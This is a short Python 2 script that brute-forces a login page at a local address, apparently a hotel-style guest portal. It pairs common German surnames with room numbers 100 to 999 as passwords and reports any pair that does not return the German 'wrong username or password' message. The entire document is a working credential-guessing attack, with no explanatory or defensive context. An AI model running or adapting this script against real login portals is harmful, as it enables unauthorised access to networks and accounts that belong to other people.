#!/usr/bin/env python

from urllib2 import urlopen
from re import compile
from sys import stdout

TARGET = 'http://192.168.0.1/Authenticator.aspx'
POST_TEMPLATE = 'username={username}&password={password}'
ERROR_MSG = 'Falscher Benutzername oder falsches Kennwort!'

NAMES = ['Schmidt', 'Schmitt', 'Mueller', 'Meier', 'Mayer', 'Schulz', 'Schulze']
ROOMS = range(100, 1000)

if __name__ == "__main__":

    error_matcher = compile(ERROR_MSG)

    for room in ROOMS:
        for name in NAMES:
            post_data = POST_TEMPLATE.format(username=name, password=room)
            response = urlopen(TARGET, post_data)
            match = error_matcher.search(response.read())
            if not match:
                print "\nFound match: {} :: {}".format(name, room)
            else:
                stdout.write(".")
                stdout.flush()

